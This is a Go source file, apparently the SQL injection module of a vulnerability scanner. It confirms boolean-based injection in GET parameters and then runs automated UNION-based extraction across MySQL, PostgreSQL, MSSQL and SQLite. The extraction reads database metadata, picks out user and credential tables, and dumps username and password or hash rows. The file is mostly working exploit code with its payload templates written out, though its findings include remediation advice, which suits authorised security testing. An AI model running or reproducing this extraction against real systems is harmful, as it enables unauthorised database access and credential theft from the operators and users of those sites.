// Package sqli detects SQL injection (boolean-based) and, when a parameter is
// injectable, extracts real data with UNION-based payloads: DBMS, current
// database, current user, tables, columns and credential rows. It supports
// MySQL, MSSQL, PostgreSQL and SQLite, in both string and numeric injection
// contexts. All payloads are read-only.
package sqli

import (
	"io"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"

	"github.com/sayseven7/frameseven/internal/config"
	"github.com/sayseven7/frameseven/internal/finding"
	"github.com/sayseven7/frameseven/internal/tools/v1/recon"
)

const marker = "frx7marker"

// response is the outcome of one injected request.
type response struct {
	status int
	body   string
	dump   string
}

// injContext describes how a payload breaks out of a parameter: a string
// context closes a quote, a numeric context appends directly.
type injContext struct {
	name        string
	boolTrue    string
	boolFalse   string
	unionPrefix string
	unionSuffix string
}

// The UNION prefix forces the original condition false so that only the
// injected row is returned and rendered, which makes extraction reliable on
// apps that display a single record.
var contexts = []injContext{
	{"string", "' AND '1'='1", "' AND '1'='2", "' AND '1'='2' UNION SELECT ", "-- -"},
	{"numeric", " AND 1=1", " AND 1=2", " AND 1=2 UNION SELECT ", "-- -"},
}

// dbProfile holds the DBMS-specific SQL used during extraction. wrap delimits a
// scalar expression with markers using that DBMS's concatenation dialect.
type dbProfile struct {
	name        string
	versionExpr string
	dbExpr      string
	userExpr    string
	tablesExpr  string
	wrap        func(expr string) string
	columnsExpr func(table string) string
	dumpExpr    func(table string, cols []string) string
}

var profiles = []dbProfile{
	{
		name:        "MySQL",
		versionExpr: "version()",
		dbExpr:      "database()",
		userExpr:    "current_user()",
		tablesExpr:  "(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())",
		wrap:        func(e string) string { return "concat('" + marker + "',(" + e + "),'" + marker + "')" },
		columnsExpr: func(t string) string {
			return "(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='" + t + "')"
		},
		dumpExpr: func(t string, cols []string) string {
			return "(SELECT group_concat(concat_ws(0x3a," + strings.Join(cols, ",") + ") SEPARATOR 0x0a) FROM " + t + ")"
		},
	},
	{
		name:        "PostgreSQL",
		versionExpr: "version()",
		dbExpr:      "current_database()",
		userExpr:    "current_user",
		tablesExpr:  "(SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public')",
		wrap:        func(e string) string { return "'" + marker + "'||(" + e + ")::text||'" + marker + "'" },
		columnsExpr: func(t string) string {
			return "(SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='" + t + "')"
		},
		dumpExpr: func(t string, cols []string) string {
			return "(SELECT string_agg(concat_ws(':'," + strings.Join(cols, ",") + "),chr(10)) FROM " + t + ")"
		},
	},
	{
		name:        "MSSQL",
		versionExpr: "@@version",
		dbExpr:      "db_name()",
		userExpr:    "system_user",
		tablesExpr:  "(SELECT STRING_AGG(name,',') FROM sys.tables)",
		wrap:        func(e string) string { return "'" + marker + "'+CONVERT(varchar(max),(" + e + "))+'" + marker + "'" },
		columnsExpr: func(t string) string {
			return "(SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('" + t + "'))"
		},
		dumpExpr: func(t string, cols []string) string {
			joined := strings.Join(cols, "+':'+")
			return "(SELECT STRING_AGG(CONVERT(varchar(max)," + joined + "),CHAR(10)) FROM " + t + ")"
		},
	},
	{
		name:        "SQLite",
		versionExpr: "sqlite_version()",
		dbExpr:      "'main'",
		userExpr:    "''",
		tablesExpr:  "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')",
		wrap:        func(e string) string { return "'" + marker + "'||(" + e + ")||'" + marker + "'" },
		columnsExpr: nil, // column listing needs PRAGMA, not reachable via UNION
		dumpExpr: func(t string, cols []string) string {
			return "(SELECT group_concat(" + strings.Join(cols, "||':'||") + ",char(10)) FROM " + t + ")"
		},
	},
}

// Run tests every discovered GET parameter for SQL injection.
func Run(cfg *config.Config, client *http.Client, surface *recon.Surface) []finding.Finding {
	var findings []finding.Finding
	tested := map[string]bool{}

	for _, p := range surface.Params {
		u, err := url.Parse(p.Endpoint)
		if err != nil {
			continue
		}

		key := p.Name + "|" + u.Path
		if tested[key] {
			continue
		}

		tested[key] = true

		findings = append(findings, testParam(cfg, client, p)...)
	}

	return findings
}

func testParam(cfg *config.Config, client *http.Client, p recon.Param) []finding.Finding {
	orig := origValue(p)

	base := request(cfg, client, p, orig)
	if base == nil {
		return nil
	}

	for _, c := range contexts {
		truthy := request(cfg, client, p, orig+c.boolTrue)
		falsy := request(cfg, client, p, orig+c.boolFalse)

		if truthy == nil || falsy == nil {
			continue
		}

		if !looksInjectable(*base, *truthy, *falsy) {
			continue
		}

		return confirmed(cfg, client, p, orig, c, *truthy)
	}

	return nil
}

func confirmed(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, detected response) []finding.Finding {
	findings := []finding.Finding{{
		Title:       "SQL injection (boolean-based) in parameter '" + p.Name + "'",
		Module:      "sqli",
		Severity:    finding.Critical,
		OWASP:       "A03:2025 - Injection",
		CWE:         "CWE-89",
		CVSS:        9.8,
		Description: "The parameter alters query logic in a " + c.name + " context: a true condition returns the baseline page while a false condition does not, confirming injectable SQL.",
		Evidence: finding.Evidence{
			Request:   detected.dump,
			Response:  trim(detected.body, 400),
			Extracted: "true: '" + orig + c.boolTrue + "' | false: '" + orig + c.boolFalse + "'",
		},
		NextSteps: []string{
			"Use parameterized queries / prepared statements for this parameter.",
			"Validate and allowlist input types before they reach the database.",
		},
	}}

	if extra := extract(cfg, client, p, orig, c); extra != nil {
		findings = append(findings, extra...)
	}

	return findings
}

// looksInjectable reports whether the true/false responses differ in the way a
// boolean-based injection produces: the true page mirrors the baseline while the
// false page diverges.
func looksInjectable(base, truthy, falsy response) bool {
	trueMatchesBase := truthy.status == base.status && similarity(base.body, truthy.body) > 0.95
	falseDiffers := falsy.status != truthy.status || similarity(truthy.body, falsy.body) < 0.95

	return trueMatchesBase && falseDiffers
}

// similarity is a cheap body-length ratio in [0,1]; 1 means identical length.
func similarity(a, b string) float64 {
	la, lb := len(a), len(b)
	if la == 0 && lb == 0 {
		return 1
	}

	max := la
	if lb > max {
		max = lb
	}

	diff := la - lb
	if diff < 0 {
		diff = -diff
	}

	return 1 - float64(diff)/float64(max)
}

// extract runs UNION-based extraction once a parameter is confirmed injectable.
func extract(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext) []finding.Finding {
	cols, pos := columnCount(cfg, client, p, orig, c)
	if cols == 0 {
		return nil
	}

	profile, version := fingerprintDBMS(cfg, client, p, orig, c, cols, pos)
	if profile == nil {
		return nil
	}

	db := readValue(cfg, client, p, orig, c, cols, pos, *profile, profile.dbExpr)
	user := readValue(cfg, client, p, orig, c, cols, pos, *profile, profile.userExpr)
	tables := readValue(cfg, client, p, orig, c, cols, pos, *profile, profile.tablesExpr)

	summary := "DBMS: " + profile.name + "\nversion: " + version +
		"\ndatabase: " + db + "\nuser: " + user + "\ntables: " + tables

	req := request(cfg, client, p, unionPayload(orig, c, cols, pos, profile.wrap(profile.versionExpr)))

	findings := []finding.Finding{{
		Title:       "SQL injection (UNION-based) data extraction confirmed",
		Module:      "sqli",
		Severity:    finding.Critical,
		OWASP:       "A03:2025 - Injection",
		CWE:         "CWE-89",
		CVSS:        9.8,
		Description: "A UNION-based payload returned live database metadata, proving full read access to the backend database.",
		Evidence: finding.Evidence{
			Request:   req.dump,
			Response:  trim(req.body, 400),
			Extracted: summary,
		},
		NextSteps: []string{
			"Treat the database as compromised: rotate credentials and review access logs.",
			"Fix the injection with prepared statements and apply least-privilege DB accounts.",
		},
	}}

	if creds := dumpCredentials(cfg, client, p, orig, c, cols, pos, *profile, tables); creds != nil {
		findings = append(findings, *creds)
	}

	return findings
}

// columnCount finds the number of columns and a position that reflects in the
// response, using a marker injected through UNION SELECT.
func columnCount(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext) (int, int) {
	for cols := 1; cols <= 20; cols++ {
		for pos := 0; pos < cols; pos++ {
			payload := unionPayload(orig, c, cols, pos, "'"+marker+"'")

			resp := request(cfg, client, p, payload)
			if resp != nil && strings.Contains(resp.body, marker) {
				return cols, pos
			}
		}
	}

	return 0, 0
}

func fingerprintDBMS(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int) (*dbProfile, string) {
	for i := range profiles {
		value := readValue(cfg, client, p, orig, c, cols, pos, profiles[i], profiles[i].versionExpr)
		if value != "" {
			return &profiles[i], value
		}
	}

	return nil, ""
}

// readValue extracts a single scalar by wrapping it between markers (in the
// DBMS's own dialect) so it can be sliced out of the response.
func readValue(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int, profile dbProfile, expr string) string {
	resp := request(cfg, client, p, unionPayload(orig, c, cols, pos, profile.wrap(expr)))
	if resp == nil {
		return ""
	}

	return between(resp.body, marker, marker)
}

func dumpCredentials(cfg *config.Config, client *http.Client, p recon.Param, orig string, c injContext, cols, pos int, profile dbProfile, tables string) *finding.Finding {
	table := pickCredentialTable(tables)
	if table == "" || profile.columnsExpr == nil {
		return nil
	}

	columns := readValue(cfg, client, p, orig, c, cols, pos, profile, profile.columnsExpr(table))
	identCol, secretCol := pickCredentialColumns(columns)

	if identCol == "" || secretCol == "" {
		return nil
	}

	dumpExpr := profile.dumpExpr(table, []string{identCol, secretCol})

	dumped := readValue(cfg, client, p, orig, c, cols, pos, profile, dumpExpr)
	if dumped == "" {
		return nil
	}

	req := request(cfg, client, p, unionPayload(orig, c, cols, pos, profile.wrap(dumpExpr)))

	return &finding.Finding{
		Title:       "Credentials extracted from table '" + table + "' via SQL injection",
		Module:      "sqli",
		Severity:    finding.Critical,
		OWASP:       "A03:2025 - Injection",
		CWE:         "CWE-89",
		CVSS:        9.8,
		Description: "UNION-based injection dumped credential rows (" + identCol + "/" + secretCol + ") from the database.",
		Evidence: finding.Evidence{
			Request:   req.dump,
			Response:  trim(req.body, 400),
			Extracted: trim(dumped, 2000),
		},
		NextSteps: []string{
			"Rotate every exposed credential immediately.",
			"Confirm passwords are stored with a strong, salted hash (argon2/bcrypt).",
		},
	}
}

func pickCredentialTable(tables string) string {
	for _, t := range splitList(tables) {
		l := strings.ToLower(t)
		if strings.Contains(l, "user") || strings.Contains(l, "account") ||
			strings.Contains(l, "member") || strings.Contains(l, "admin") ||
			strings.Contains(l, "login") || strings.Contains(l, "credential") {
			return t
		}
	}

	return ""
}

func pickCredentialColumns(columns string) (string, string) {
	var ident, secret string

	for _, col := range splitList(columns) {
		l := strings.ToLower(col)

		if ident == "" && (strings.Contains(l, "user") || strings.Contains(l, "email") ||
			strings.Contains(l, "login") || l == "name") {
			ident = col
		}

		if secret == "" && (strings.Contains(l, "pass") || strings.Contains(l, "pwd") ||
			strings.Contains(l, "hash") || strings.Contains(l, "secret")) {
			secret = col
		}
	}

	return ident, secret
}

// unionPayload builds "<orig><prefix>NULL,...,<expr>,...,NULL<suffix>".
func unionPayload(orig string, c injContext, cols, pos int, expr string) string {
	parts := make([]string, cols)
	for i := range parts {
		if i == pos {
			parts[i] = expr
		} else {
			parts[i] = "NULL"
		}
	}

	return orig + c.unionPrefix + strings.Join(parts, ",") + c.unionSuffix
}

// origValue returns the parameter's current value, defaulting to "1".
func origValue(p recon.Param) string {
	u, err := url.Parse(p.Endpoint)
	if err != nil {
		return "1"
	}

	if v := u.Query().Get(p.Name); v != "" {
		return v
	}

	return "1"
}

// request sets parameter p to value and performs a GET.
func request(cfg *config.Config, client *http.Client, p recon.Param, value string) *response {
	u, err := url.Parse(p.Endpoint)
	if err != nil {
		return nil
	}

	q := u.Query()
	q.Set(p.Name, value)
	u.RawQuery = q.Encode()

	req, err := http.NewRequest(http.MethodGet, u.String(), nil)
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", cfg.UserAgent)

	dump, _ := httputil.DumpRequestOut(req, false)

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))

	return &response{status: resp.StatusCode, body: string(body), dump: string(dump)}
}

func between(s, start, end string) string {
	i := strings.Index(s, start)
	if i < 0 {
		return ""
	}

	rest := s[i+len(start):]

	j := strings.Index(rest, end)
	if j < 0 {
		return ""
	}

	return rest[:j]
}

func splitList(s string) []string {
	fields := strings.FieldsFunc(s, func(r rune) bool {
		return r == ',' || r == '\n'
	})

	var out []string
	for _, f := range fields {
		f = strings.TrimSpace(f)
		if f != "" {
			out = append(out, f)
		}
	}

	return out
}

func trim(s string, max int) string {
	if len(s) > max {
		return s[:max]
	}

	return s
}
